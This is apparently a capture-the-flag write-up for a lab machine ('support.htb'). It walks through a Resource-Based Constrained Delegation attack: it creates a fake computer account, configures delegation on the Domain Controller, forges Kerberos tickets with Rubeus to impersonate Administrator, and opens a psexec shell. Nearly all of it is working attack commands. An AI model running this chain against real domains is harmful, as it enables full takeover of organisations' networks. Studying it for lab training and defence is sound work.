
In a nutshell, through a Resource Based Constrained Delegation attack we can add a computer under our control to the domain; let's call this computer $FAKE-COMP01 , and configure the Domain Controller (DC) to allow $FAKE-COMP01 to act on behalf of it. Then, by acting on behalf of the DC we can request Kerberos tickets for $FAKE-COMP01 , with the ability to impersonate a highly privileged user on the Domain, such as the Administrator . After the Kerberos tickets are generated, we can Pass the Ticket (PtT) and authenticate as this privileged user, giving us control over the entire domain. 

The attack relies on three prerequisites: 

- We need a shell or code execution as a domain user that belongs to the Authenticated Users group. By default any member of this group can add up to 10 computers to the domain. 
- The ms-ds-machineaccountquota attribute needs to be higher than 0. This attribute controls the amount of computers that authenticated domain users can add to the domain.
- Our current user or a group that our user is a member of, needs to have WRITE privileges (GenericAll , WriteDACL) over a domain joined computer (in this case the Domain Controller).

---

1. Is User part of the "Authenticated Users" Group?

```
whoami /groups
```

2. Let's check the value of the ms-ds-machineaccountquota attribute. Is it 10?

```
Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

The output of the above command shows that this attribute is set to 10, which means each authenticated domain user can add up to 10 computers to the domain.

3. Next, let's verify that the msds-allowedtoactonbehalfofotheridentity attribute is empty. To do so, we need the PowerView module for PowerShell. We can upload it to the server via Evil-WinRM as shown previously. 

We can then import it with the following command

```
. ./PowerView.ps1
```

Once the module has been imported we can use the Get-DomainComputer commandlet to query the required information.

```
Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity
```

If the output is empty, we can perform the RBCD Attack.

We will need PowerMad and Rubeus, which we can upload using Evil-WinRM as shown previously. PowerMad can be imported with the following command.

```
. ./Powermad.ps1
```

# Creating a Computer Object

Now, let's create a fake computer and add it to the domain. We can use PowerMad's New-MachineAccount to achieve this.

```
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

Verify it worked:

```
Get-ADComputer -identity FAKE-COMP01
```

# Configuring RBCD

Next, we will need to configure Resource-Based Constrained Delegation through one of two ways. We can either set the PrincipalsAllowedToDelegateToAccount value to FAKE-COMP01 through the builtin PowerShell Active Directory module, which will in turn configure the msds-allowedtoactonbehalfofotheridentity attribute on its own.

Let's use the Set-ADComputer command to configure RBCD.

```
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

To verify that the command worked run the following command:

```
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

As we can see, the PrincipalsAllowedToDelegateToAccount is set to FAKE-COMP01 , which means the command worked. 

We can also verify the value of the msds-allowedtoactonbehalfofotheridentity

```
Get-DomainComputer DC | select msds-allowedtoactonbehalfofotheridentity
```

As we can see, the msds-allowedtoactonbehalfofotheridentity now has a value, but because the type of this attribute is Raw Security Descriptor we will have to convert the bytes to a string to understand what's going on.

First, let's grab the desired value and dump it to a variable called RawBytes .

```
$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

Then, let's convert these bytes to a Raw Security Descriptor object.

```
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

Finally, we can print both the entire security descriptor, as well as the DiscretionaryAcl class, which represents the Access Control List that specifies the machines that can act on behalf of the DC.

```
$Descriptor
$Descriptor.DiscretionaryAcl
```

From the output we can see that the SecurityIdentifier is set to the SID of FAKE-COMP01 that we saw earlier, and the AceType is set to AccessAllowed 

# Performing a S4U Attack

It is now time to perform the S4U attack, which will allow us to obtain a Kerberos ticket on behalf of the Administrator. 

We will be using Rubeus to perform this attack. First, we will need the hash of the password that was used to create the computer object.

```
.\Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb
```

Utilize the "rc4_hmac" hashed password.

```
58A478135A93AC3BF058A5EA0E8FDB71
```

Next, we can generate Kerberos tickets for the Administrator.
(Note: Break out evil-winrm and get an shell)

```
Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:58A478135A93AC3BF058A5EA0E8FDB71 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt /nowrap
```

Rubeus successfuly generated the tickets. We can now grab the last Base64 encoded ticket and use it on our local machine to get a shell on the DC as Administrator . To do so, copy the value of the last ticket and paste it inside a file called ticket.kirbi.b64

Note: Before pasting the value to the file make sure to remove any whitespace characters from the value.

Next, create a new file called ticket.kirbi with the Base64 decoded value of the previous ticket.

```
base64 -d ticket.kirbi.b64 > ticket.kirbi
```

Finally, we can convert this ticket to a format that Impacket can use. This can be achieved with Impackets TicketConverter.py

```
impacket-ticketConverter ticket.kirbi ticket.ccache                    
```

To acquire a shell we can use Impackets psexec.py 

```
KRB5CCNAME=ticket.ccache impacket-psexec support.htb/administrator@dc.support.htb -k -no-pass
```

